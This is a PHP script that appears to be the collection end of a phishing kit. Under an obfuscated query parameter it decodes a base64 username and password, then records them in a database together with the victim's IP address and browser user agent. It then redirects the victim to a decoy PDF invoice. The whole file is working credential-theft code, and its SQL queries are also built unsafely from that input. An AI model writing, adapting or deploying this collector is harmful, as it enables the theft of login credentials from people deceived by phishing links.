<?php
require 'functions.php';

if(isset($_GET['sdjghdfhUWTURTURET456546shfdjdkgfjdkgweruioweoitjhkfmgflkfgheu'])){
$url=$_GET['sdjghdfhUWTURTURET456546shfdjdkgfjdkgweruioweoitjhkfmgflkfgheu'];
$newUrl= base64_decode($url);
$daTa=explode('/',$newUrl);
$uSerName=$daTa[1];
$pasSword=$daTa[2];
$ip = $_SERVER['REMOTE_ADDR'];
$os = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');

    if ($uSerName !==null && $pasSword !==null){
        $checkuser= "SELECT username FROM main WHERE  username='".$uSerName."'";
        $result =mysqli_query($conn, $checkuser);
        $rowcount =mysqli_num_rows( $result );
       

     if($rowcount > 0){
              $Query_Update = "UPDATE main SET password='".$pasSword."', ip='".$ip."', useragent='".$os."', date='".$date."' WHERE  username='".$uSerName."'";
                             if (mysqli_query($conn, $Query_Update)===TRUE){
                                 
                                 //write redirection code below
                header('location:EBHG P&A PK 20MM, Cart 24 JAN 23.pdf');
            }
            
        }else{
           
           
            $Query_insert = "INSERT INTO main (username, password, ip, useragent, date)
                       VALUES ('$uSerName', '$pasSword', '$ip','$os','$date')";
                       
                    
            if (mysqli_query($conn, $Query_insert)===TRUE){
                
               //write redirection code below
              header('location:EBHG P&A PK 20MM, Cart 24 JAN 23.pdf');
             } 
                   
        }
  
    

}else{
   
    header('location:error.php');
}
}else{
    
    header('location:error.php');
}

?>

